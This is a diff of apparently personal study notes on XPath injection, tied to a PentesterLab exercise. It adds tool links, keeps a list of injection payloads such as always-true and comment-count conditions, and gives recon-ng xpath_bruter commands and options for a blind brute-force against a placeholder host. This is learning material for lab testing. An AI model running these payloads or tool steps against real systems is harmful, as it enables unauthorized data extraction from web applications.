@@ -1,3 +1,8 @@
+#Testing Tool
+https://code.google.com/archive/p/xpath-blind-explorer/downloads
+https://github.com/danielhnmoreno/Xpath-Blind-Explorer
+
+# Nice write up
 https://pentesterlab.com/exercises/web_for_pentester/course
 
 # Orig request
@@ -29,9 +34,43 @@ x' or name()='username' or 'x'='y
 ' and count(/comment())=1 and '1'='1
 =========== END ATTACKS ==================
 
-
-
 ' and '1'='1 and you should get the same result.
 ' or '1'='0 and you should get the same result.
 ' and '1'='0 and you should not get any result.
 ' or '1'='1 and you should get all results.
+
+========================= ATTACK USING RECON-NG ==============================
+# run recon-ng
+recon-ng
+
+# Set proxy if needed
+set PROXY localhost:8080
+
+# Load xpath module
+use xpath
+
+
+# Setting options (See comments in line)
+set BASE_URL http://xxx.xxx.xxx.xxx/hello.php
+set PARAMETERS name=hacker<inject>
+set STRING hacker
+
+[recon-ng][default][xpath_bruter] > show options
+  Name        Current Value                       Required  Description
+  ----------  -------------                       --------  -----------
+# You only need the base URL
+  BASE_URL    http://x.x.x.xxxx/xml/example2.php  yes       target resource url excluding any parameters
+  BASIC_PASS                                      no        password for basic authentication
+  BASIC_USER                                      no        username for basic authentication
+  COOKIE                                          no        cookie string containing authenticated session data
+# Notice you do not need the "?"
+# Seems to want to use the <inject> after the parameters
+  PARAMETERS  name=hacker<inject>                 yes       query parameters with '<inject>' signifying the injection
+  POST        False                               yes       set the request method to post. parameters should still be submitted in the url option
+# Not sure what this means, I use something in the URL.
+  STRING      hacker                              yes       unique string found when the injection results in 'True'
+
+# Run the attack
+run
+
+========================= ATTACK USING RECON-NG ==============================
